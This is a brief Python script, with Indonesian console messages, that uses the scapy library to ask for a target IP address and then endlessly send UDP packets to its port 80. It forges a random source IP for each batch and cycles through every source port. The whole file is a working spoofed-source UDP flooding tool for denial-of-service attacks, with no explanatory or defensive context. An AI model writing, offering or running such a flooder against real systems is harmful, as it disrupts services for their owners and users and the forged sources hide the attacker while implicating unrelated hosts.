import random
from scapy.all import *

target_IP = input("Masukkan alamat IP target: ")
i = 1

while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."
    source_IP = a + dot + b + dot + c + dot + d

    for source_port in range(1, 65535):
        IP1 = IP(src=source_IP, dst=target_IP)
        UDP1 = UDP(sport=source_port, dport=80)
        pkt = IP1 / UDP1
        send(pkt, inter=0.001)

        print("Paket terkirim", i)
        i = i + 1
